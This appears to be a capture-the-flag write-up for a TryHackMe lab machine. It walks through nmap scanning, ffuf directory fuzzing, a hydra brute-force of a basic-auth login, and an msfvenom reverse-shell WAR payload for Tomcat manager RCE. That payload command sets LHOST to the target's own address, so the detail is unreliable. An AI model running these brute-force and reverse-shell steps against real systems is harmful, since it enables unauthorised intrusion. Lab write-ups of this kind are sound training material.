
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Tools%20r%20us/images/126-1.png)

As always, i started with a ports scanning.

```text
nmap -sS -T4 10.10.135.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 04:50 EST
Nmap scan report for 10.10.135.176
Host is up (0.078s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13
```

```text
nmap -sV -sC -p22,80,1234,8009 10.10.135.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 04:50 EST
Nmap scan report for 10.10.135.176
Host is up (0.057s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:cc:65:72:b9:22:f6:1a:de:49:78:0e:10:7c:e8:91 (RSA)
|   256 57:a7:01:ff:4d:e4:7b:01:c4:f9:92:42:f5:a1:14:fa (ECDSA)
|_  256 27:b3:cd:e8:97:8d:6a:5e:b9:a0:e8:0a:58:77:a0:00 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Tools%20r%20us/images/126-2.png)
I decided to find some hidden directories.

```text
./ffuf -u http://10.10.135.176/FUZZ -w /usr/share/wordlists/dirb/common.txt -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.135.176/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12]
                        [Status: 200, Size: 168, Words: 16, Lines: 5]
.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12]
guidelines              [Status: 301, Size: 319, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 168, Words: 16, Lines: 5]
protected               [Status: 401, Size: 460, Words: 42, Lines: 15]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12]
:: Progress: [4615/4615] :: Job [1/1] :: 659 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

In the /guidelines page i found this note 
```text
Hey bob, did you update that TomCat server?
```

In the /protected page i saw this pop u which prompted me to log in.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Tools%20r%20us/images/126-3.png)

I had the username, bob and decided to bruteforce it's password.  
```text
hydra -l bob -P /usr/share/wordlists/1050_passwords.txt -f 10.10.135.176  http-get /protected
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-15 05:02:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1049 login tries (l:1/p:1049), ~66 tries per task
[DATA] attacking http-get://10.10.135.176:80/protected
[80][http-get] host: 10.10.135.176   login: bob   password: bubbles
[STATUS] attack finished for 10.10.135.176 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-15 05:02:45
```
When i logged in, the page contained this message.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Tools%20r%20us/images/126-4.png)

Based on the results of the nmap scan, i visited the service on the port 1234 which displayed the tomcat config page.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Tools%20r%20us/images/126-5.png)  

The page /manager/html can lead to RCE.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Tools%20r%20us/images/126-6.png)  

```text
https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/

1.msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.135.176 LPORT=4444 -f war > shell.war
2. upload the WAR file
3. start the listener
4. deploy the file
```
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Tools%20r%20us/images/126-7.png)

It seems this service runs with root privileges.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/Great_rooms/Tools%20r%20us/images/126-8.png)
